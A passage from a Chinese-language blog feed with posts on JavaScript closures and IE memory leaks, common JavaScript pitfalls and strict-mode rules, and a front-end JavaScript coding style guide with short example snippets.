class="line"></span><br></pre></td></tr></table></figure><p>　　你可能又不解了，这里怎么会弹出1呢？<span>先说明下，下面三种写法效果是等价的（但解析方式并不一样，A、C是一类，B是另一类，这里就不多说了）：</span></p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">~<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    foo();</span><br><span class="line">&#125;(); <span class="comment">//A</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    foo();</span><br><span class="line">&#125;()); <span class="comment">//B</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    foo();</span><br><span class="line">&#125;)(); <span class="comment">//C</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>闭包的内存分配方式</h3><p>　　回归正题，上面为什么会弹出1，这个闭包的情况和上面所述的闭包有些不太相同，上面的闭包是因为作用域中的东西没有被销毁，并与上下文存在暧昧关系，而这里并不存在销毁什么的问题，但是它依旧是一个闭包。在foo中，x是一个自由变量，当foo这个闭包产生的时候，foo的上下文会被保存，而foo处于Activation状态的时候，它会先从他所处的Activation Object（foo内部声明的变量、函数等非自由变量）中查找需要的对象，如果没有找到，便会从它开始保存的上下文中查找对象，如果还没找到，才会跑到他的上一层作用域链中取那个值为2的x。</p><p>　　再回到之前说的那个问题，闭包的内存分配方式。很明显，如果闭包的内存分配是利用栈的结构实现的，那进入foo运行状态的时候，应该会push一个\全局\的x，也就是向上找到那个var x = 2，接着alert(2)；但事实并非如此，上层作用域的闭包数据是动态分配的内存，也就是保存在堆里，解析器会记录这个闭包数据被引用的次数，当引用次数为0的时候，垃圾回收机制（GC）会自动处理这些垃圾。</p><h3>闭包是如何霸占内存的</h3><p>　　IE经常会因为闭包的存在而导致内存居高不下。第一个例子中：</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span> &lt;=&gt; foo &lt;=&gt; 匿名函数 &lt;=&gt; bar &lt;=&gt; <span class="built_in">window</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;&#x2F;&#x3D;&gt;&lt;&#x2F;&#x3D;&gt;&lt;&#x2F;&#x3D;&gt;&lt;&#x2F;&#x3D;&gt;</p><p>　　形成了一个引用循环，即便是</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bar</span> <span class="operator">=</span> null<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　这个匿名函数的引用次数依旧大于0。需要注意的即便是是delete一个变量并不是删除这个变量的引用对象，而是断开这个引用，其作用就是让引用对象的引用次数减1. 这样一来，这个闭包就死在内存里了，于是它也就一直占用着内存= =</p><h3>小结</h3><p>　　原型链、闭包、作用域链的学习，除了对这些基本知识有一定了解之外，还需要比较多的尝试和实践才能理解透彻。很多次想说说闭包的含义，但是每次提笔又觉得自己没有想明白，只好作罢。这一次对闭包的浅析，肯定也存在很多不到位或者描述错误的地方，如果有不同的见解，请提出来，大家相互学习！！！</p><p><span>&nbsp;</span></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript中需要注意的几个问题</title>
      <link href="/blog/2013/09/22/cb-javascript-attention/"/>
      <url>/blog/2013/09/22/cb-javascript-attention/</url>
      
        <content type="html"><![CDATA[<p>　　JavaScript是一门弱语言，她使用起来不像C/C++那样有十分繁琐的内存管理、类型定义等，所以学习JavaScript的门槛相对来说也比较低。门槛低并不意味着这门语言很简单，我们在使用的时候会遇到各种千奇百怪的问题，有些是因为浏览器的兼容性引起的，有些是因为JS语法本身所引起的，还有些是因为ECMAScript标准的改变而引起的，总之，这样的问题很多，下面列举</p><h3>几个比较容易忽略的点</h3><p>　　<strong>1. switch的case判断</strong></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="keyword">event</span>.keyCode;</span><br><span class="line"><span class="keyword">switch</span> (t) &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&#x27;65&#x27;</span>:</span><br><span class="line">      alert(<span class="string">&quot;Yay!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　当keycode为65时，你会发现，咦？怎么木有alert！ 这里需要明确的是，switch在判断的时候使用的是全等号\==="，全等号在比较的时候首先看数据类型是不是一样的，而在这里，t是Number类型，而'65'是String。</p><p>　　<strong>2. 严格模式下this&ne;window</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">//undefined</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　有时候我们需要用global来缓存this这个全局环境（可能是window，也可能是其他的，比如在Worker中没有window对象，用self代表Global），但是在严格模式下函数作用域返回的this为undefined，一般，我们可以采用如下方式获取到Global对象：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;return this&quot;</span>)();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(t);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="variable language_">window</span>.<span class="built_in">eval</span>(<span class="string">&quot;this&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(t);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　因为new Function是在全局作用域上执行的，所以返回的是Global对象，下面的eval需要一起注意，eval前如果不交window，那它便处于function作用域中（javascript利用function里分隔作用域），自然不会返回window或者全局对象。使用Function要注意一点：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> local = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">new</span> <span class="keyword">Function</span>(<span class="params"><span class="string">&quot;console.log(typeof local);&quot;</span></span>)(<span class="params"></span>); // <span class="title function_">logs</span> <span class="title function_">undefined</span></span><br><span class="line">&#125;(<span class="params"></span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　new Function工作在Global作用域链下，所以是访问不到匿名函数中local的~</p><p>　　<strong>3. 变量提升（Hoisting）</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="string">&quot;global&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(t); <span class="comment">//undefined</span></span><br><span class="line">    <span class="keyword">return</span>; 　　 <span class="keyword">var</span> t = <span class="string">&quot;local&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　这是一个老生常谈的问题，var最好不好到处散布。所谓的变量提升，在这里存在两个作用域，一个是Global作用域，他下面有t和foo这两个变量，而foo指向的是foo作用域，foo作用域下有一个t变量，画个图演示下吧</p><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">[<span class="keyword">Global</span> <span class="keyword">Scope</span>]</span><br><span class="line">    |<span class="type">----- t</span>   [String] undefined -&gt; <span class="string">&quot;global&quot;</span></span><br><span class="line">    |<span class="type">----- foo</span> [Reference] [foo <span class="keyword">Scope</span>]</span><br><span class="line"></span><br><span class="line">[foo <span class="keyword">Scope</span>]</span><br><span class="line">    |<span class="type">----- t</span>   [String] undefined -&gt; <span class="string">&quot;local&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　刚进入全局作用域链的时候，程序扫描到t和foo两个变量，于是给这个t赋值为undefined，扫面完了之后，看到t有值，于是给赋值"global\，foo指向[foo Scope]，于是进入[foo Scope]，继续扫描函数作用域链下的变量，发现目标t之后，赋值为undefined，在console.log时，是这样的：</p><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line"><span class="built_in">var</span> <span class="built_in">t</span> = <span class="string">&quot;global&quot;</span>;</span><br><span class="line">function foo()&#123;</span><br><span class="line">    <span class="built_in">var</span> <span class="built_in">t</span>; // 等同于 -&gt; <span class="built_in">var</span> <span class="built_in">t</span> = undefined;</span><br><span class="line">    console.log(<span class="built_in">t</span>); //undefined     return; 　     <span class="built_in">var</span> <span class="built_in">t</span> = <span class="string">&quot;local&quot;</span>; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　上面的例子写不写return结果都是一样的，加return，只是为了更好的表达变量提升这个动作的存在。一般比较推荐的变量定义方式：</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="variable">function</span> <span class="title function_">foo</span>(<span class="params">a</span>, <span class="params">b</span>, <span class="params">c</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>,</span><br><span class="line">        <span class="variable">bar</span>,</span><br><span class="line">        <span class="variable">baz</span> <span class="operator">=</span> <span class="string">&quot;something&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　一个var，后边连着一串变量的定义。</p><h3>附：javascript严格模式下要注意的地方（转自<a href="http://www.web-tinker.com/article/20125.html" target="_blank">次碳酸钴</a>）</h3><p>&nbsp;<strong>1. 变量必须声明才能使用</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line">a=<span class="number">1</span>; <span class="comment">//缺少var语句做声明，因此报错</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> a=b=<span class="number">1</span>; <span class="comment">//错误 b未声明</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;<strong>2. 函数声明语句（不包括表达式）不允许在普通代码块（不包括闭包）中使用</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">//闭包中是允许使用函数声明语句的</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line">&#125;)();</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> f=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;; <span class="comment">//函数声明表达式允许</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>)&#123;&#125;; <span class="comment">//函数声明语句在普通闭包中，错误</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3. 闭包内的this不指向Global对象</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="variable language_">this</span>); <span class="comment">//输出undefined</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4. 对象属性和函数形参不能重复声明</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> o=&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">a</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">//这个对象定义了两个a属性，因此报错</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">a,a</span>)&#123;&#125;;</span><br><span class="line"><span class="comment">//这个函数的两个形参都是a，因此报错</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>5. eval拥有类似闭包的作用域</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>,b=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;var a=2&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="built_in">eval</span>(<span class="string">&quot;var b=2&quot;</span>);</span><br><span class="line"><span class="title function_">alert</span>(a); <span class="comment">//输出1 因为运行的a变成了eval作用域的局部变量</span></span><br><span class="line"><span class="title function_">alert</span>(b); <span class="comment">//输出2 window.eval依然是全局作用域</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>6. callee和caller属性无法使用</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>; <span class="comment">//错误 callee无法使用</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">func</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>7. with语句无法使用</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="title function_">with</span>(&#123;&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>8. 八进制数字常量无法使用</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> a=<span class="number">0999</span>; <span class="comment">//十进制，可以使用</span></span><br><span class="line"><span class="keyword">var</span> b=<span class="number">0123</span>; <span class="comment">//八禁止，无法使用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>9. 普通模式下的一些无效操作变成错误</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">delete</span> a;</span><br><span class="line"><span class="comment">//错误 无法删除var声明的变量</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> o=&#123;<span class="keyword">get</span> <span class="title function_">a</span>()&#123;&#125;&#125;;</span><br><span class="line">o.<span class="property">a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//错误 给只读属性赋值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单总结这么多，推荐\<a title="次碳酸钴" href="http://www.web-tinker.com/" target="_blank">次碳酸钴</a>"童鞋的博客，细致入微、内容深刻，博客入口：<a title="次碳酸钴" href="http://www.web-tinker.com/" target="_blank">http://www.web-tinker.com</a></p><p>关于JavaScript strict mode的详细介绍，请移步：<a href="//developer.mozilla.org/en-US/docs/JavaScript/Reference/Functions_and_function_scope/Strict_mode" rel="nofollow" target="_blank">MDN Strict_mode</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端编码规范之JavaScript</title>
      <link href="/blog/2013/08/14/cb-javascript-spec/"/>
      <url>/blog/2013/08/14/cb-javascript-spec/</url>
      
        <content type="html"><![CDATA[<p>　　上次浅谈了下<a href="http://www.cnblogs.com/hustskyking/p/css-spec.html" target="_blank">关于CSS的编码规范</a>，大部分童鞋持赞同意见，仍存在一些童鞋不太理解这些规范的意义。</p><p>　　如果是个人或者小作坊开发，其实这些所谓的编码规范也没啥意思，因为大家写好的代码直接就给扔到网上去了，很少有打包、压缩、校检等过程，别人来修改你代码的情况也比较少。但是，对于一定规模的团队来说，这些东西还是挺有必要的！<strong><span>一个是保持代码的整洁美观，同时良好的代码编写格式和注释方式可以让后来者很快地了解你代码的大概思路，提高开发效率。</span></strong></p><p>　　那么这次，继续<span><strong>抛砖引玉</strong></span>，说说Javascript一些需要引起注意的地方（这些东西也是团队开发的时候大家集思广益总结出来的）。</p><h3>不规范写法举例</h3><p><strong>1.&nbsp;句尾<span>没有分号</span></strong></p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">var isHotel = json.<span class="keyword">type</span> <span class="type">== </span><span class="string">&quot;hotel&quot;</span> ? <span class="literal">true</span> : <span class="type">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2.<span>&nbsp;变量命名</span>各种各样</strong></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var is_hotel<span class="comment">;</span></span><br><span class="line">var isHotel<span class="comment">;</span></span><br><span class="line">var ishotel<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.&nbsp;<span>if</span> 缩写</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (isHotel)</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4.&nbsp;使用<span> eval</span></strong></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var json <span class="operator">=</span> eval(jsonText)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>5.&nbsp;<span>变量未定义</span>到处都是</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> isHotel = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">    .......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> html = isHotel ? <span class="string">&#x27;&lt;p&gt;hotel&lt;/p&gt;&#x27;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>6.&nbsp;<span>超长函数</span></strong></p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> isHotel = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">    <span class="comment">//....... 此处省略500行</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>7.&nbsp;..........</strong></p><p><span>书写不规范的代码让我们难以维护，有时候也让我们头疼。</span></p><p><span><strong><span>（禁止）、（必须）<span><span>等字眼，在这里</span><span>只是表示强调，未严格要求</span>。</span></span></strong></span></p><h3>前端规范之JavaScript</h3><p><strong>&nbsp;1.&nbsp;<span>tab</span>键用<span>（必须）<span>用</span></span><span>四个空格</span>代替</strong></p><p>这个原因已经在<a href="http://www.cnblogs.com/hustskyking/p/css-spec.html" target="_blank">前端编码规范之CSS</a>说过了，不再赘述。</p><p><strong>2. 每句代码后<span>（必须）</span>加"<span>;</span>"</strong></p><p>&nbsp;这个是要引起注意的，比如：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">a = b        <span class="regexp">//</span> 赋值</span><br><span class="line">(<span class="keyword">function</span>()&#123;</span><br><span class="line">    <span class="regexp">//</span>....</span><br><span class="line">&#125;)()         <span class="regexp">//</span> 自执行函数</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;未加分号，结果被解析成</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">a = b(<span class="keyword">function</span>()&#123;<span class="regexp">//</span>...&#125;)()  <span class="regexp">//</span>将b()()返回的结果赋值给a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;这是截然不同的两个结果，所以对于这个问题必须引起重视！！！</p><p><strong>3.&nbsp;变量、常量、类的<span>命名</span>按<span>（必须）</span>以下规则执行：</strong></p><p>　　<strong>1）<span>&nbsp;变量</span>：<code>必须</code>采用<span><code>骆驼峰</code></span>的命名且首字母小写</strong></p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的命名</span></span><br><span class="line"> <span class="keyword">var</span> isHotel,</span><br><span class="line">     isHotelBeijing,</span><br><span class="line">     isHotelBeijingHandian;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 不推荐的命名</span></span><br><span class="line"> <span class="keyword">var</span> is_Hotel,</span><br><span class="line">     ishotelbeijing,</span><br><span class="line">     IsHotelBeiJing;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　<strong>2）<span>&nbsp;常量</span>：<code>必须</code>采用<span>全大写的</span>命名，且单词以<code>_</code>分割</strong>，常量通常用于ajax请求url，和一些不会改变的数据</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的命名</span></span><br><span class="line">  <span class="keyword">var</span> HOTEL_GET_URL = <span class="string">&#x27;http://map.baidu.com/detail&#x27;</span>,</span><br><span class="line">      PLACE_TYPE = <span class="string">&#x27;hotel&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　<strong>3）<span>&nbsp;类</span>：<code>必须</code>采用<span><code>骆驼峰</code></span>的命名且<span>首字母大写</span></strong>，如：</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"> <span class="keyword">var</span> <span class="title class_">FooAndToo</span> <span class="operator">=</span> <span class="title function_">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">     <span class="variable language_">this</span>.<span class="property">name</span> <span class="operator">=</span> <span class="variable">name</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4.&nbsp;<span>空格</span>的使用</strong></p><p><strong>　　1）<span><code>if</code></span><span>中的空格，先上例子</span></strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正确的写法</span></span><br><span class="line"> <span class="keyword">if</span> (isOk) &#123;</span><br><span class="line">     <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//不推荐的写法</span></span><br><span class="line"> <span class="keyword">if</span>(isOk)&#123;</span><br><span class="line">     <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>()</code>中的判断条件前后都<span>(<code>必须)</code></span>加空格</li><li><code>()</code>里的判断前后<span>(<code>禁止)</code></span>加空格，如：正确的写法:&nbsp;<code>if (isOk)</code>；不推荐的写法:&nbsp;<code>if ( isOk )</code></li></ul><p><strong>　　2）<span><code>switch</code></span><span>中的空格, 先上例子</span></strong></p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正确的写法</span></span><br><span class="line">  <span class="keyword">switch</span>(name) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;hotel&quot;</span>:</span><br><span class="line">          console.<span class="built_in">log</span>(name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;moive&quot;</span>:</span><br><span class="line">          console.<span class="built_in">log</span>(name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">          <span class="comment">// code</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//不推荐的写法</span></span><br><span class="line">  <span class="keyword">switch</span> (name) &#123;                     <span class="comment">// switch 后不应该有空格, 正确的写法: switch(name) &#123; // code</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;hotel&quot;</span>:</span><br><span class="line">          console.<span class="built_in">log</span>(name);</span><br><span class="line">      <span class="keyword">break</span>;                          <span class="comment">// break; 应该和console.log对齐</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;movie&quot;</span>:                   <span class="comment">// 每个case之前需要有换行</span></span><br><span class="line">          console.<span class="built_in">log</span>(name);</span><br><span class="line">      <span class="keyword">break</span>;                          <span class="comment">// break; 应该和console.log对齐</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">          <span class="comment">// code</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;　　<strong>3）<span><code>for</code></span>中的空格，先上例子</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"> <span class="keyword">var</span> names = [<span class="string">&quot;hotel&quot;</span>, <span class="string">&quot;movie&quot;</span>],</span><br><span class="line">     i, <span class="built_in">len</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>, <span class="built_in">len</span>=names.length; i &lt; <span class="built_in">len</span>; i++) &#123;</span><br><span class="line">     <span class="comment">// code</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 不推荐的写法</span></span><br><span class="line"> <span class="keyword">var</span> names = [<span class="string">&quot;hotel&quot;</span>, <span class="string">&quot;movie&quot;</span>],</span><br><span class="line">     i, <span class="built_in">len</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span>(i = <span class="number">0</span>, <span class="built_in">len</span> = names.length;i &lt; <span class="built_in">len</span>;i++) &#123;          <span class="comment">// for后应该有空格，每个`;`号后需要有空格，变量的赋值不应该有空格</span></span><br><span class="line">     <span class="comment">// code</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong><span><code>for</code></span></strong>后<strong><span>（<code>必须）</code></span></strong>加空格</li><li>每个<span><code>;</code></span>后<strong><span>（<code>必须）</code></span></strong>加空格</li><li><strong><span><code>()</code></span></strong>中<code>禁止</code>用<strong><span><code>var</code></span></strong>声明变量; 且变量的赋值&nbsp;<strong><span><code>=&nbsp;</code></span></strong>前后<strong><span>（<code>禁止）</code></span></strong>加空格</li></ul><p><strong>　　4）<span><code>function</code>&nbsp;</span>中的空格, 先上例子</strong></p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">call</span><span class="params">(name)</span> &#123;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> cell = <span class="keyword">function</span> <span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 不推荐的写法</span></span><br><span class="line"> <span class="keyword">var</span> call = <span class="keyword">function</span><span class="params">(name)</span>&#123;</span><br><span class="line">     <span class="comment">// code</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>参数的反括号后<span><strong>（<code>必须）</code></strong></span>加空格</li><li><strong><span><code>function</code>&nbsp;</span></strong>后<span><strong>（<code>必须）</code></strong></span>加空格</li></ul><p><strong>　　5）<span><code>var</code>&nbsp;</span>中空格及定义，先上例子</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一个推荐的var写法组</span></span><br><span class="line"> <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">     <span class="keyword">var</span> code = <span class="number">1</span> + <span class="number">1</span>,</span><br><span class="line">         json = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(res),</span><br><span class="line">         type, html;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// code</span></span><br><span class="line"> &#125;</span><br><span 